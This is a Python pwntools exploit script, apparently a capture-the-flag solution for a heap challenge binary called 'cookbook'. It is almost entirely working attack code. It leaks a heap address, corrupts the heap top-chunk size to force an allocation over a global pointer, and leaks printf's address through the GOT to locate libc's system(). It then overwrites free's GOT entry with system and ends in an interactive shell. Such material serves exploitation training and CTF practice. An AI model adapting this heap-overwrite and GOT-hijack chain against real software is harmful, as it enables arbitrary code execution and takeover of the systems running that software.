#Author:unamer
from pwn import *
p=process('./cookbook')
p.recvuntil('?')
p.sendline('abc')
e=ELF('./cookbook')
libc=ELF('./libc.so')
#we create a new recipe contains 0x40c bytes
p.recvuntil('it')
p.sendline('c')
p.recvuntil('it')
p.sendline('n')
p.recvuntil('it')
#now free the recipe
p.sendline('d')
p.recvuntil('it')
p.sendline('q')
#create a ingredient
p.recvuntil('it')
p.sendline('a')
p.recvuntil('quit')
p.sendline('n')
p.recvuntil('quit')
p.sendline('q')
#now memory is ready,send the payloads
p.recvuntil('it')
p.sendline('c')
p.recvuntil('it')
p.sendline('p')
p.recvuntil(')\n')
heapaddr=u32(p.recv(4))+0x90
print '[*] heap address:'+hex(heapaddr)
p.recv()
p.sendline('g')
p.sendline(p32(0)*2+p32(0xffffffff))
p.recvuntil('it')
p.sendline('q')
#now alloc a huge num memory
p.recvuntil('it')
p.sendline('g')
p.recvuntil(':')
g_ingredint=0x0804D09C
size=0xffffffff-heapaddr+g_ingredint-0x8*2
print '[+] size:'+hex(size)
p.sendline(hex(size)[2:])
#fgets cannot handle the huge data,so we donesn't need to input name
#now overwrite the ingredint pointer
p.recvuntil('it')
p.sendline('g')
p.recvuntil(':')
p.sendline('80')
p.sendline(p32(0)+p32(e.got['printf']-8))
#now leak the printf address
p.recvuntil('it')
p.sendline('a')
p.recvuntil('quit')
p.sendline('l')
p.recvuntil(': ')
printf_addr=u32(p.recv(4))
p.recv()
print '[*] printf address:'+hex(printf_addr)
system=printf_addr-(libc.symbols['printf']-libc.symbols['system'])
memcpy=printf_addr-(libc.symbols['printf']-libc.symbols['memcpy'])
print '[*] system addrress:'+hex(system)
#now overwrite the free function
p.sendline('g')
p.sendline('/bin/sh\x00'+p32(system))
#Successfully exploit!
p.interactive()


